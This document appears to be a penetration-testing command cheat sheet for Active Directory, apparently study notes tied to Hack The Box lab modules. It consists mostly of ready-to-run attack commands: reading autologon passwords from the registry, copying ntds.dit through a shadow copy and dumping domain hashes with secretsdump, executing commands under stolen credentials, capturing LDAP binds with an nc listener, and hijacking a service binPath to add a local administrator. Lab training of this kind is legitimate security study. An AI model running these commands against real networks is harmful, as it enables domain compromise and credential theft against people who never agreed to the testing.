#### Tags: #CommandAppendix #ActiveDirectory #ADEnum #Kerberoasting #ASREPRoasting #SilverTicket #ACLAbuse #DCSync #PasswordSpray #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Module22 #Module23 #LDAPSearch #GPP #SYSVOL #DomainShares #GenericAll #LateralMovement #WMI #WinRM #PsExec #PassTheHash #OverpassTheHash #PassTheTicket #DCOM #GoldenTicket #ShadowCopy #vshadow #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #impacket-smbserver #Module27 #ccache #KRB5CCNAME #keytab #kinit #ShadowCredentials #pywhisker #PKINITtools #bloodhoundPython #Snaffler #DomainPasswordSpray #PASSWD_NOTREQD #ReversibleEncryption #dsquery #LivingOffTheLand #AccountOperators #ExchangeWindowsPermissions #bloodyAD #windapsearch #NetExecNTDS
## Winlogon autologon and HTTP fallback

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

```bash
feroxbuster -u http://$BoxIP/ -w $Wordlist -x html,txt,php -t 30 -o $BoxDir/nmap/ferox.txt
```

Use the Winlogon query when a foothold has no useful groups or privileges. Use the web scan when anonymous RPC, LDAP, and SMB enumeration return no useful usernames.

## Flight: Offline NTDS extraction without Kerberos

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<N>\Windows\System32\config\SYSTEM C:\Windows\Temp\sys2.save
vssadmin delete shadows /all /quiet
```

```bash
secretsdump.py LOCAL -ntds ntds.dit -system sys2.save -just-dc-ntlm
```

Use the shadow-copy number printed by vssadmin. This is an offline parse and does not use Kerberos.

## Flight: RunasCs credentialed execution

```cmd
.\RunasCs.exe $Username $Password "cmd /c <command>"
```

Use this when valid credentials exist but the account cannot obtain an interactive WinRM, RDP, or PsExec session.

## LDAP Passback and Server Operators

```bash
# Listen for a service's outbound LDAP Simple Bind
nc -lvnp 389

# Trigger an editable LDAP server address field
curl -s -X POST --data "ip=$LocalIP" http://$BoxIP/settings.php
```

```powershell
# Query and temporarily abuse a LocalSystem service
sc.exe qc $ServiceName
sc.exe config $ServiceName binPath= "cmd.exe /c <command>"
sc.exe start $ServiceName
net localgroup administrators $Username /add
net localgroup administrators $Username /delete
```

Restore the original service path immediately after the command runs.

## External Resources

- [HackTricks - Active Directory](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [InternalAllTheThings - Active Directory](https://github.com/swisskyrepo/InternalAllTheThings)
